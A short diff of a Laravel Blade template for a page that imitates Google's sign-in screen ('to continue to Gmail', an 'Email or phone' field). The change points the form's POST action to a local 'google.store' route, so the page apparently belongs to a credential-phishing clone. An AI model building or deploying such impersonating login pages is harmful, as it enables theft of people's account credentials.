@@ -247,9 +247,9 @@
                     <p class="subtitle">to continue to Gmail</p>
                 </div>
 
-                
+
                 <div class="right-section">
-                    <form method="POST" action="{{ route('login.store') }}">
+                    <form method="POST" action="{{ route('google.store') }}">
                         @csrf
 
                         <input type="text" name="email" placeholder="Email or phone" value="{{ old('email') }}" required />
